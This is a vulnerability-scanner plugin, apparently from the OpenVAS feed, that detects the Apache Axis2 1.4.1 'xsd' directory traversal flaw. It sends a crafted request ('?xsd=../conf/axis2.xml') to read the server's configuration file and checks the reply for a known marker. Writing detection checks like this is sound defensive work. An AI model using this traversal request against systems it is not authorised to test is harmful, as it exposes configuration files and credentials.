# SPDX-FileCopyrightText: 2015 SCHUTZWERK GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later

CPE = "cpe:/a:apache:axis2";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.111007");
  script_version("2023-10-09T05:05:36+0000");
  script_tag(name:"last_modification", value:"2023-10-09 05:05:36 +0000 (Mon, 09 Oct 2023)");
  script_tag(name:"creation_date", value:"2015-03-20 08:00:00 +0100 (Fri, 20 Mar 2015)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Apache Axis2 1.4.1 'xsd' Parameter Directory Traversal Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 SCHUTZWERK GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_apache_axis2_http_detect.nasl", "sw_apache_axis2_web_services_http_detect.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("apache/axis2/http/detected", "apache/axis2/webservices/detected");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/12721");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/40343");

  script_tag(name:"summary", value:"Apache Axis2 is prone to a directory traversal vulnerability
  because it fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Exploiting this issue may allow an attacker to obtain sensitive
  information that could aid in further attacks.");

  script_tag(name:"affected", value:"Apache Axis2 1.4.1 is vulnerable. Other versions may be
  affected.");

  script_tag(name:"solution", value:"The vendor has released fixes. Please see the references for
  more information.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

if( ! services = get_kb_list( "apache/axis2/webservices/http/" + port + "/list" ) )
  exit( 0 ); # nb: Don't report as not vuln / exit(99) if no services are exposed

pattern = '<axisconfig name="AxisJava2\\.0">';

foreach service( services ) {

  url = service + "?xsd=../conf/axis2.xml";

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
